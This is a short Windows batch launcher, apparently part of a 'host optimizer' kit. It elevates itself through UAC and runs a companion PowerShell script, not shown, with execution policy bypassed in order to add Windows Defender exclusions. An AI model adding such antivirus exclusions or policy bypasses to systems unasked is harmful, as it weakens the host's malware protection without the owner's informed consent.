@echo off
setlocal
cd /d "%~dp0"
title DENTE HOST OPTIMIZER - DEFENDER EXCLUSIONS

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [i] Zapros prav administratora (UAC)...
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/k ""%~f0" elevated"' -Verb RunAs"
    exit /b
)

echo ==================================================================
echo   DENTE HOST OPTIMIZER: WINDOWS DEFENDER EXCLUSIONS
echo ==================================================================
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%~dp0host_tune_defender.ps1"

echo.
echo ==================================================================
echo   Nastrojka zavershena. Nazhmite lyubuyu klavishu dlya vyhoda.
echo ==================================================================
pause
